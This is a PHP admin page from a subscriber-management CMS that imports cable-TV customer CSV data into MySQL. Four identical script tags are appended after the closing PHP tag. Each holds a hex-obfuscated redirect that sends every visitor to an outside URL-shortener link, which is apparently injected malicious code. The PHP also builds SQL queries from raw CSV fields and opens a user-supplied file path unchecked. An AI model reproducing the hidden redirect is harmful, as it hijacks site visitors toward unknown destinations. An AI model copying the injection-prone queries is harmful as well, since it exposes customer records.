<?php
require_once("helper.php");
$msg    =  isset($_GET['msg']) ? $_GET['msg'] : '';
$id     = base64_decode($_GET['id']);
class myCms extends Cms 
{
    function registerAjaxFunctions()
    {
        $this->xajax->registerFunction("get_Listing");
        $this->xajax->registerFunction("update_status");
        $this->xajax->registerFunction("deleteRow");
        $this->xajax->registerFunction("editMode");
        $this->xajax->registerFunction("sorting");
        $this->xajax->registerFunction("sortTitle");
    }
}
$objMisc = new myCms();
$objMisc->initializeAjax(false,true);
$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;
$objMisc->rec_pp = 20;
$objMisc->dbFunc->ajax_pagin = true;
if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['submit'])){
    if(!empty($_POST['attachment'])){
        $fileName="uploads/".$_POST['attachment'];
        if (!$fp = fopen($fileName,"r")){
            echo "Sorry, cannot open the file";
        }else{       
            while(!feof($fp)) {
                while (($data = fgetcsv($fp, 10000, ",")) !== FALSE) { 
                        //print_r($data); exit;
                         $fileRow++;    
                        $num = count($data);
                        if ($fileRow <= "1") continue;      // Continue Back Bcz its blank row in the CSV File 
                        
                        //Code For Area
                            //print_r($data);exit;
                            $area=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND `NAME`='$data[2]'",'WING_ID','wing_master');
                            if($area=='' && ($data[2]!='' || $data[2]!=0)){
                                $areaArray = array( 'HEADOFFICE_ID'           =>$_SESSION['HEADOFFICE'],
                                                    'NAME'              =>addslashes($data[2]),
                                                    'ADDED_BY'          =>'1',
                                                    'ADDED_TIME'        =>date('Y-m-d H:i:s'),
                                                    );
                                $insertLang=$objMisc->insert('wing_master',$areaArray);
                                $area=mysqli_insert_id($_SESSION['CONN']);
                            }

                        //Code For Sub Area

                            $subArea=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND WING_ID='$area' AND NAME='$data[3]'",'UNIT_ID','unit_master');
                            if($subArea=='' && ($data[3]!='' || $data[3]!=0)){
                                $subAreaArray = array( 'HEADOFFICE_ID'        =>$_SESSION['HEADOFFICE'],
                                                    'NAME'              =>addslashes($data[3]),
                                                    'WING_ID'           =>$area,
                                                    'ADDED_BY'          =>'1',
                                                    'ADDED_TIME'        =>date('Y-m-d H:i:s'),
                                                    );
                                $insertSubarea=$objMisc->insert('unit_master',$subAreaArray);
                                $subArea=mysqli_insert_id($_SESSION['CONN']);
                            }

                        //Code For Setup Boxes

                            $subscription=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND STB_NO='$data[1]'",'SUBSCRIPTION_ID','subscriptions');
                            if($subscription=='' && ($data[1]!='' || $data[1]!=0)){
                                $subscriptionArray = array( 'HEADOFFICE_ID'          =>$_SESSION['HEADOFFICE'],
                                                            
                                                            'STB_NO'           =>addslashes($data[1]),
                                                            'CARTON_NO'           =>addslashes($data[17]),
                                                            'SAF_NO'           =>addslashes($data[19]),
                                                            'MAC_NO'           =>addslashes($data[20]),
                                                            'VC_NO'           =>addslashes($data[18]),
                                                            'MODEL'           =>addslashes($data[21]),
                                                            'STATUS'           =>'B',
                                                            'ADDED_BY'          =>'1',
                                                            'ADDED_TIME'        =>date('Y-m-d H:i:s'),
                                                            );
                                $insertSubscription=$objMisc->insert('subscriptions',$subscriptionArray);
                                $subscription=mysqli_insert_id($_SESSION['CONN']);
                            }

                        //Code For PACKAGE

                        $package_id=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND NAME='$data[12]'",'PACKAGE_ID','package_master');
                        if($package_id=='' && ($data[12]!='' || $data[12]!=0)){
                            $packageArray = array( 'HEADOFFICE_ID'  =>$_SESSION['HEADOFFICE'],
                                                'NAME'              =>addslashes($data[12]),
                                                'PARENT_CHARGES'    =>$data[10],
                                                'ADDED_BY'          =>$_SESSION['USER_ID'],
                                                'ADDED_TIME'        =>date('Y-m-d H:i:s'),
                                                );
                            $insertPackage=$objMisc->insert('package_master',$packageArray);
                            $package_id=mysqli_insert_id($_SESSION['CONN']);
                        }
                        

                        /*Code For Subscriber Insertion
                            $customer_id = $objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' ORDER BY SUBSCRIBER_ID DESC LIMIT 1",'CUSTOMER_ID','subscribers');
                            $mso_id      = $objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' ORDER BY SUBSCRIBER_ID DESC LIMIT 1",'MSO_ID','subscribers');
                            if(empty($customer_id)){
                                $customerId='000001';
                            }else{
                                $customerId=sprintf("%06d", $customer_id+1);
                            }
                            if(empty($mso_id)){
                                $msoId='000001';
                            }else{
                                $msoId=sprintf("%06d", $mso_id+1);
                            }*/
                            $uniCustId=$data[7];
                            $subscriber=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND NAME='$data[4]' AND MSO_ID='$data[6]' AND CUSTOMER_ID='$uniCustId'",'SUBSCRIBER_ID','subscribers');
                            if(empty($subscriber)){
                                $subscriberArray = array('HEADOFFICE_ID'          =>$_SESSION['HEADOFFICE'],
                                                        'NAME'             =>addslashes($data[4]),
                                                        'PAYMENT_METHOD'   =>'P',
                                                        'ADDRESS'          =>addslashes($data[5]),
                                                        'CONNECTION_DATE'  =>$objMisc->changeDateFormat($data[8]),
                                                        'OPENING_BALANCE'  =>addslashes($data[9]),
                                                        'AMOUNT'           =>addslashes($data[10]),
                                                        'UNIT_ID'          =>$subArea,
                                                        'CUSTOMER_ID'      =>addslashes($uniCustId),
                                                        'PHONE_NO'         =>addslashes($data[14]),
                                                        'MOBILE_NO'        =>addslashes($data[15]),
                                                        'EMAIL'            =>addslashes($data[16]),
                                                        'ID_TYPE'          =>addslashes($data[22]),
                                                        'ID_NO'            =>addslashes($data[23]),
                                                        'IDENTITY_NAME'    =>addslashes($data[24]),
                                                        'INSTALLED_BY'     =>addslashes($data[25]),
                                                        'RELATION'         =>addslashes($data[26]),
                                                        'RELATIVE'         =>addslashes($data[27]),
                                                        'PACKAGE_ID'       =>$package_id,
                                                        'REMARKS'          =>addslashes($data[13]),
                                                        'MSO_ID'           =>addslashes($data[6]),
                                                        'ADDED_BY'         =>$_SESSION['USER_ID'],
                                                        'ADDED_TIME'       =>date('Y-m-d H:i:s'),
                                                            );
                         
                                $insertSubscribers=$objMisc->insert('subscribers',$subscriberArray);
                                $subscriber=mysqli_insert_id($_SESSION['CONN']);
                                if(!empty($data[9]) && $data[9]!=0){
                                    $openingBalanceArray=array(
                                        'HEADOFFICE_ID'     =>$_SESSION['HEADOFFICE'],
                                        'SUBSCRIBER_ID'     =>$subscriber,
                                        'RECEIPT_NO'        =>'Opening Balance',
                                        'AMOUNT_TYPE'       =>(($data[9]>0)?'D':'C'),
                                        'ADDED_TIME'       =>date('Y-m-d H:i:s'),
                                        'MONTH_DATE'       =>date('Y-m-d'),
                                        'AMOUNT'            =>abs($data[9]));
                                    $insOpeningBal=$objMisc->insert('monthly_charges',$openingBalanceArray);
                                }
                                $userId=$objMisc->GiveValue("`ID`='$subscriber' AND USER_TYPE='S'",'USER_ID','users');
                                if(!empty($data[14]) && empty($userId)){
                                    $userArray=array('HEADOFFICE_ID'    =>$_SESSION['HEADOFFICE'],
                                                     'USERNAME'         =>$data[14],
                                                     'USER_TYPE'        =>'S',
                                                     'ID'               =>$subscriber,
                                                     'PASSWORD'         =>rand(111111,999999));
                                    $insertAsUser=$objMisc->insert('users',$userArray);
                                }else{
                                    if(!empty($data[7]) && empty($userId)){
                                        $userArray=array('HEADOFFICE_ID'    =>$_SESSION['HEADOFFICE'],
                                                         'USERNAME'         =>$data[7],
                                                         'USER_TYPE'        =>'S',
                                                         'ID'               =>$subscriber,
                                                         'PASSWORD'         =>rand(111111,999999));
                                        $insertAsUser=$objMisc->insert('users',$userArray);
                                    }
                                }
                            }else{
                                $amount1=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND SUBSCRIBER_ID='$subscriber'",'AMOUNT','subscribers');
                                $amount=$amount+$amount1;
                                $where=" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND SUBSCRIBER_ID='$subscriber'";
                                $Array1=array('AMOUNT' =>$amount);
                                $update=$objMisc->update('subscribers',$Array1,$where);
                            }

                        //Code For Setup Box Partition
                            if($subscription=='' && ($data[1]=='' || $data[1]==0)){
                                $subscriptionArray = array( 'HEADOFFICE_ID'    =>$_SESSION['HEADOFFICE'],
                                                            'STB_NO'           =>'DUM-'.$subscriber.'-'.$_SESSION['HEADOFFICE'].'-'.date('His'),
                                                            'STATUS'           =>'B',
                                                            'ADDED_BY'         =>'1',
                                                            'ADDED_TIME'       =>date('Y-m-d H:i:s'),
                                                            );
                                $insertSubscription=$objMisc->insert('subscriptions',$subscriptionArray);
                                $subscription=mysqli_insert_id($_SESSION['CONN']);
                            }
                            $setupBox=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND SUBSCRIPTION_ID='$subscription'",'STB_ID','stb_box');
                            if($setupBox==''){
                                $setupBoxArray = array(     'HEADOFFICE_ID'    =>$_SESSION['HEADOFFICE'],
                                                            'SUBSCRIPTION_ID'  =>$subscription,
                                                            'SUBSCRIBER_ID'    =>$subscriber,
                                                            'PACKAGE_ID'       =>$package_id,
                                                            'ADDED_BY'         =>'1',
                                                            'STATUS'           =>(($data[11]=='D')?'D':'A'),
                                                            'ADDED_TIME'       =>date('Y-m-d H:i:s'),
                                                            );
                                $insertSetupBox=$objMisc->insert('stb_box',$setupBoxArray);
                                $SetupBox=mysqli_insert_id($_SESSION['CONN']);
                            }
                    }
            }
            $_SESSION['msg']=1;
            header("LOCATION:import-subscribers.php");
            exit;
        } 
    }else{
        $_SESSION['msg']=2;
        header("LOCATION:import-subscribers.php");
        exit;
    }
}
$msg = isset($_SESSION['msg']) ? $_SESSION['msg'] : $msg;
unset($_SESSION['msg']);

switch ($msg)
{
    case 1:
        $msg = "Data imported successfully.";
    break;
    case 2:
        $msg = "";
        $errormsg = "Please try again later! Problem during completing this task.";
    break;
    case 3:
        $msg = "";
        $errormsg = "New Password And Confirm password should be same.";
    break;
}
//echo 'test';exit;
$smartyVars['group']        =   $id;
$smartyVars['errormsg']     =   $errormsg;
$smartyVars['add']          =   $add;
$smartyVars['resRow']       =   $rowArray;
$smartyVars['pageheading']  =   $pageheading;
$smartyVars['classData']    =   $pagin_recs;
$smartyVars['msg']          =   $msg;
$smartyVars['page']         =   $_REQUEST['page'];
$objMisc->displayPage("header,import-subscribers,footer",$smartyVars);  
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>